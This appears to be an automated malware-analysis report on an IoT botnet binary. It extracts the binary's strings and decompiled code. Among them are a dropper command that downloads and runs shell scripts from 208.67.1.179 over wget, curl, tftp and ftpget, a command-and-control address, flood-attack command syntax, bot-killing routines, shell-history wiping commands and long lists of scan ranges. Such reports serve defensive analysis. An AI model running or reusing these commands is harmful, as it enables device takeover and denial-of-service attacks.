=============================================================================
========	BINARY ID :2a7c74d92f7ded3419c954a68f8758c3ee8f1570==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :1780
SUPSCPECTED LINES COUNT :200
SUPSCPECTED STRINGS COUNT (DISTINCT) :31
SUPSCPECTED STRINGS WEIGHT :120
SUSPECT STRING SCORE : [120 / 150] 80%
USER AGENTS STRINGS COUNT :9
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :198
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
/361////////2//////////3/M//////0/////2/21//////////////2////2///1///1//5/////N/////5//////////////////
.//////4/1//////1////1//1////N///////M//21///M////1///////////N//////////N//////////O//////////////////2///1//2///M//////////////22////N//R1//////112//////////12//////1/////1/////////////////////////0/////////2/////1//1//1/////N/////L///3/2///////////////////0//0////
bin*
botnet
swatnet
fucknet
cracknet
weednet
gaynet
queernet
ballnet
unet
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
telnet
/dev/netslink/
/usr/
/bin/sh
/proc/cpuinfo
PING
Failed opening raw socket.
Invalid flag "%s"
pkill -9 
pkill -9 "
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
SCANNER
STOPPING SCANNER
STARTING SCANNER ON -> %s
COMMENCING BOT KILL ON -> %s
UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
HTTP
HTTPFLOOD
CNC <target> <port> <time>
STD <target> <port> <time>
KILLATTK
Killed %d.
None Killed.
/proc/net/route
TOXICNET
/etc/rc.d/rc.local
fork failed\n
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
/proc/stat
/proc/cpuinfo
processor
/sys/devices/system/cpu
/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
fdopen_pids
libc/sysdeps/linux/arm/vfork.S
getpid.c
fork.c
waitpid.c
kill.c
sigprocmask.c
spec_flags.4860
strstr.c
_string_syserrmsgs.c
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname2.c
hoste.5443
connect.c
socket.c
__malloc_largebin_index
rand.c
random.c
randtbl
random_r.c
random_poly_info
nprocessors_onln
system.c
libc/sysdeps/linux/arm/sigrestorer.S
inet_aton.c
gethostbyname2_r.c
inet_pton4
inet_ntop4
dnslookup.c
get_hosts_byname_r.c
gethostbyname_r.c
gethostname.c
read_etc_hosts_r.c
__read_etc_hosts_r
waitpid
__res_sync
random
connect
GetRandomPublicIP
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
makeRandomStr
sendHTTP
GetRandomIP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
sendHTTP2
__GI_srandom_r
kill
__GI_sigprocmask
inet_addr
__GI_gethostname
connectTimeout
__GI_kill
__local_nameserver
gethostbyname2_r
strstr
init_rand
rand
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
__get_hosts_byname_r
botkiller
__GI_inet_pton
gethostbyname
__vfork
knownBots
gethostname
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_gethostbyname2
__GI_strstr
__GI_connect
inet_ntop
gethostbyname2
__GI_inet_aton
__GI_vfork
__GI_gethostbyname2_r
__GI_inet_addr
__libc_connect
pids
sigprocmask
0ëꀰϡꀠᣡᬰϥ舠ૠꀰã숰ᣥᬀ0ëꀰⓡᬀᣥᬐϥꀠǡꀹ忣3ëꀰᓡରᣥᬀ7ᓫᬰϥꀀೡ䯐â鵨Ứ
#ëꀰ᳡ର᳥ᬰ˥茻᳣ର샥ᬀӥꀐ᳣ᬠ菥#˫ꀰ볣䬲죡ᬰϥꀸ⏡ꀸϡꀀ쯡-ëꀰ뫡䬲쓡ᬠ⳥䬰Ӣ茰ˢꀀϡꀐ
1ëꀠ鳡鼿鋥쌓ˠ茰쏠ꀓ싡ꀿǡ挐㓠ଐ㓥ᬰϥꀴ㓡ᬐϥ愰ˠ挠㓠ଠ㓥ᬠ￥Ȱ峢鼯ǥ숰燥1ëꀠ僡鼿鋥쌓ˠ茰쏠ꀓ싡ꀿǡ挐ムଐュᬰϥꀴメᬐϥ愰ˠ挠ムଠュᬠ￥Ȱტ鼯˥숰廥1ëꀠӡ鼿鋥쌓ˠ茰쏠ꀓ싡ꀿǡ挐Ⳡଐ⳥ᬰϥꀴⳡᬐϥ愰ˠ挠Ⳡଠ⳥ᬠ￥Ȱ쓢鼮ϥ숰䯥1ëꀠ룡鼾鋥쌓ˠ茰쏠ꀓ싡ꀿǡ挐⣠ଐ⣥ᬰϥꀴ⣡ᬐϥ愰ˠ挠⣠ଠ⣥ᬠ￥Ȱ磢鼮ӥ숰㣥1ëꀐ烡鼾釥쌣䏠ꀣ쇡ꀿˡ挀àꀰϡꀡˡꀱϡ戰à茰Ϡꀲǡ挰რରქᬰå匀ৣ
\rëꀰϡꀐ뗡ꀴ쏣ꀺӡꀡᓡ䬀â舠Ϡ舰à茐ⓥᬠ뗥ꀴ쏣ꀺˡꀡᓡ䬐Ǣ舠Ϡ舰à鍀⃥ᬰϥꀀメ\nëꀰǡ茰Ӣꀀáꀐϣꀠˡ\n⓫ᬠ뗥ꀴ쏣ꀺˡꀡᓡ䬀â舠Ϡ舰à錰⃥ᬠϥꀀˡꀐ웡\n⓫ᬰǥ茰ⓢରåꀀᓣ鼑㫥\vëꀰ⃡ର⃥ᬰå匀싣
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
208.67.1.179:23
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
112.5.%d.%d
117.165.%d.%d
85.3.%d.%d
37.158.%d.%d
95.9.%d.%d
41.252.%d.%d
58.71.%d.%d
104.55.%d.%d
78.186.%d.%d
78.189.%d.%d
221.120.%d.%d
88.5.%d.%d
41.254.%d.%d
103.20.%d.%d
103.47.%d.%d
103.57.%d.%d
45.117.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
14.204.%d.%d
27.0.%d.%d
27.8.%d.%d
27.50.%d.%d
27.54.%d.%d
27.98.%d.%d
27.112.%d.%d
27.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
43.253.%d.%d
43.230.%d.%d
163.53.%d.%d
62.252.%d.%d
43.245.%d.%d
62.255.%d.%d
123.25.%d.%d
103.54.%d.%d
27.255.%d.%d
103.204.%d.%d
123.24.%d.%d
113.191.%d.%d
81.100.%d.%d
113.188.%d.%d
113.189.%d.%d
94.174.%d.%d
14.160.%d.%d
14.161.%d.%d
14.162.%d.%d
14.163.%d.%d
14.164.%d.%d
14.165.%d.%d
14.166.%d.%d
14.167.%d.%d
14.168.%d.%d
14.169.%d.%d
14.170.%d.%d
14.171.%d.%d
14.172.%d.%d
14.173.%d.%d
14.174.%d.%d
14.175.%d.%d
14.176.%d.%d
14.177.%d.%d
14.178.%d.%d
14.179.%d.%d
14.180.%d.%d
14.181.%d.%d
14.182.%d.%d
14.183.%d.%d
14.184.%d.%d
14.185.%d.%d
14.186.%d.%d
14.187.%d.%d
14.188.%d.%d
14.189.%d.%d
14.190.%d.%d
14.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.252.%d.%d
43.240.%d.%d
41.174.%d.%d
49.118.%d.%d
78.188.%d.%d
45.127.%d.%d
103.30.%d.%d
14.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
41.253.%d.%d
117.173.%d.%d
113.190.%d.%d
146.88.%d.%d
112.196.%d.%d
113.178.%d.%d
112.45.%d.%d
183.223.%d.%d
116.71.%d.%d
103.44.%d.%d
110.235.%d.%d
124.253.%d.%d
211.237.%d.%d
117.175.%d.%d
178.93.%d.%d
111.9.%d.%d
222.252.%d.%d
113.174.%d.%d
113.160.%d.%d
113.161.%d.%d
113.162.%d.%d
113.163.%d.%d
113.164.%d.%d
113.165.%d.%d
113.166.%d.%d
113.167.%d.%d
113.168.%d.%d
113.169.%d.%d
123.17.%d.%d
123.18.%d.%d
123.19.%d.%d
123.20.%d.%d
123.21.%d.%d
123.22.%d.%d
222.253.%d.%d
222.254.%d.%d
222.255.%d.%d
37.247.%d.%d
41.208.%d.%d
183.220.%d.%d
175.201.%d.%d
103.198.%d.%d
50.205.%d.%d
88.248.%d.%d
88.105.%d.%d
88.247.%d.%d
85.105.%d.%d
188.3.%d.%d
103.203.%d.%d
103.55.%d.%d
103.220.%d.%d
183.233.%d.%d
103.242.%d.%d
103.14.%d.%d
103.195.%d.%d
103.214.%d.%d
103.218.%d.%d
103.225.%d.%d
103.228.%d.%d
103.231.%d.%d
103.60.%d.%d
103.248.%d.%d
103.253.%d.%d
103.255.%d.%d
103.35.%d.%d
103.49.%d.%d
103.62.%d.%d
144.48.%d.%d
163.47.%d.%d
223.29.%d.%d
59.153.%d.%d
113.176.%d.%d
113.175.%d.%d
113.177.%d.%d
113.183.%d.%d
202.164.%d.%d
203.134.%d.%d
210.56.%d.%d
49.156.%d.%d
203.210.%d.%d
117.181.%d.%d
117.178.%d.%d
117.177.%d.%d
117.176.%d.%d
117.170.%d.%d
117.171.%d.%d
117.162.%d.%d
112.26.%d.%d
112.27.%d.%d
112.28.%d.%d
112.29.%d.%d
112.30.%d.%d
112.31.%d.%d
203.150.%d.%d
50.233.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
/proc/stat
/proc/cpuinfo
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
cd /root;rm -rf .bash_history
ClearHistory
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 72908
+++TOTAL FUNCTIONS 			:361
+++LINES PER FUNCTION RATIO 	: 201.961218836565
+++SUSPECTED LINES COUNT 	: 1568
+++SUSPECTED LINES RATIO 	: 2.15065562078236
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 72908
+++WHILE (TRUE) LINES			: 16135
+++WHILE (TRUE) LINES RATION		:22.130630383497%
+++WHILE (TRUE) LOOPS COUNT		: 258
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
    char (*v75)[430] = " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/",
        "/opt/"
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v96 = __GI_open((int32_t)"/proc/cpuinfo", 0); // 0x9674
    int32_t v98 = __GI_open((int32_t)"/proc/cpuinfo", 0); // 0x98a4
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
        int32_t v102 = __GI_open((int32_t)"/proc/net/route", 0); // 0x11c28
    int32_t v90 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x11f10
    char * v92 = "/etc/rc.d/rc.local";
        v91 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        v92 = "/etc/rc.conf";
                                int32_t v112 = __GI_fopen((int32_t)v92, (int32_t)&v111); // 0x12098
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen();
int32_t _stdio_fopen(void) {
    if (__GI_fopen(v96, (int32_t)&v95 - 0x89f0) == 0) {
        int32_t v105 = __GI_fopen(v94 - 0x8620, v94 - 0x89f0); // 0x1cb4c
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "208.67.1.179:23"

    char (*v73)[16] = "208.67.1.179:23";

    char (*v75)[430] = " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";

        szprintf((int32_t)&v99, (int32_t)"112.5.%d.%d", (int32_t)v94, (int32_t)v95, 0);

        szprintf((int32_t)&v99, (int32_t)"117.165.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"85.3.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"37.158.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"95.9.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"41.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"58.71.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"104.55.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"78.186.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"78.189.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"221.120.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"88.5.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"41.254.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.20.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.47.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.57.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"45.117.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"101.51.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"137.59.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"1.56.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"1.188.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.204.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"27.0.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"27.8.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"27.50.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"27.54.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"27.98.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"27.112.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"27.192.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"36.32.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"36.248.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"39.64.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"42.4.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"42.48.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"42.52.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"42.56.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"42.63.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"42.84.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"42.176.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"42.224.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"42.176.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"43.253.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"43.230.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"163.53.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"43.230.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"62.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"43.245.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"62.255.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"123.25.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.54.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"27.255.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.204.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"123.24.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.191.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"81.100.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.188.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.189.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"94.174.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.160.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.161.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.162.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.163.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.164.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.165.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.166.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.167.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.168.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.169.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.170.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.171.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.172.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.173.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.174.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.175.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.176.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.177.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.178.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.179.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.180.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.181.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.182.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.183.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.184.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.185.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.186.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.187.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.188.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.189.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.190.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.191.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"45.121.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"45.120.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"45.115.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"43.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"43.230.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"43.240.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"43.245.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"41.174.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"49.118.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"78.188.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"45.127.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.30.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"14.33.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"123.16.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"202.44.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"116.93.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

